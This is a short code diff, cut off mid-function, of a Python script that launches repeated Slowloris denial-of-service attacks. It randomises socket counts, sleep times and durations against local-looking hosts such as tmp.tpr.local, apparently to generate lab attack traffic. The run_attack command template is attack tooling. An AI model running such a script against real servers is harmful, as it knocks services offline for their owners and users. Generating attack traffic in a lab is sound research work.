@@ -6,10 +6,10 @@ hosts_l = ['tmp.tpr.local','tmp2.tpr.local']
 sleeptime_l = [4,9,14]              # secs
 sockets_range = (150, 200)          # connections
 duration_range = (2, 6)             # mins
-attack_interval_range = (30, 90)    # secs
+# attack_interval_range = (30, 90)    # secs
 
 def run_attack(timeout, host, sockets, sleeptime):
-    command = 'timeout {secs}s python3 slowloris.py {host} -ua -s {sockets} --sleeptime {sleeptime}'
+    command = 'timeout {secs}s slowloris {host} -ua -s {sockets} --sleeptime {sleeptime}'
     command = command.format(
         secs=timeout,
         host=host,
